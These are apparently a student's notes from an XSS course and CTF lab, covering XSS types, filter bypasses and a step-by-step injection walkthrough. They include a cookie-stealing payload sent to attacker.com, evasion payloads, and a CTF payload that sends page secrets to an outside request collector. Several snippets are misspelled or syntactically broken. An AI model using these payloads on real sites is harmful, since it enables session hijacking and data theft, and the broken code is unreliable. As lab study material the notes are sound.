# XSS Client Script

## Part 1. Review
1. XSS
  - An attack in which an attacker injects malicious executable scripts into the code of a trusted application or website
  - Stored XSS: Board or DB
  - Reflected XSS: Server, GET Method, URL Transmission
  - DOM Based XSS
  - Cookie Steal
```javascript
<script>var cookieData = document.cookie;var i = new Image();i.src = "http://attacker.com" + cookieData;</script>
```

2. XSS countermeasure
* detour method
  - Mix upper and lower case </br>
  - image tag
```javascript
<img src=x oneerror = "alert(1)">
```
  - herf
```javascript
<a href="javascript"alert(1)">TEST</a>
```
  - javascript XSS < , > => ";alert(1);var+a = "
```javascript
<script> var data = "________";
```
  - input XSS => <input type = "text" value="efwe">
```javascript
<input type = "text" onmousehandler="alert(1)"
```
  - HTML special character -> HTML Entity
  - HTML Editor
    - HTML special characters replaced with HTML Entity in the parameter.
    - Distiguish available tags and make them live (Based on the white list).
    - Revived tags were filtered in the violated event handler based on black lists

## Part 2. Client Script

- Page Redirect
```javascript
<script>location.href="google.com";</script>
```
```javascript
<script>location.replace("google.com")</script>
```
- Modulate address
```javascript
<script>history.pushState(null, null, 'test')</script>
```
- DOM object contact
```javascript
document.getElement
document.getElementById('userName');
document.getElementsByClassName('card-title');
document.getElementsByClassName('card-title')[0];
// Tracking the number to pull out the information
document.getElementById('userName');.className
// Pull out the other element information
document.getElementById('userName').innerHTML;
// Tag inside information
```

## Part 3. CTF - Basic Script Practice

1. Open DevTol and check where is the location to bring out the flag information.
2. In the Console at DevTol, type the script => bring the information
```javascript
document.getElementsByNamme('info')      
```
3. In the Console at DevTol, type the script => getElements is the list, so make it specified
```javascript
document.getElementsByNamme('info')[0]
```
4. Type the Script => get the single element information
```javascript
document.getElementsByName('info')[0].placeholder
```
5. Make attack statement =>
```javascript
var secretData = document.getElementsByName('info')[0].placeholder; console.log(secretData);
```
6. Check the attack statement in the Console
7. In Burp Suite, check XSS availability
8. Type <"'>, next to username "seungho"
9. Make XSS attack statement
```javascript
"><img+src=x+onerror="alert(1)
```
10. Input the attack statement
```javascript
"><img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);
```
* To use script
```javascript
window.addEventListener('DOMContentLoaded'function(){ //execute code});
```
9-1. Make XSS attack statement
```javascript
"><script>alert(1)</script>
```
10-1. Input the attack statement
```javascript
"><script>window.addEventListener('DOMContentLoaded'function(){<img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);});</script>
```
11. Check attack
```javascript
"><img+src="https://x"+onerror="location.href='https://enjt04rx79at.x.pipedream.net/?data='%2b document.getElementsByName('info')[0].placeholder;">
```

## Part 4. XSS in Board
- iframe
```javascript
<ifram src="HTTP://~~~/mypage.php"id="tagetFrame"></iframe>
```
```javascript
<script>var tagetTag = document.getElementByID('targetFrame');var DOMData = targetTag.contentDocument;DOMData.getElementByID()</script>
```

## Part 5. Assignmnet
- Review
- CTF
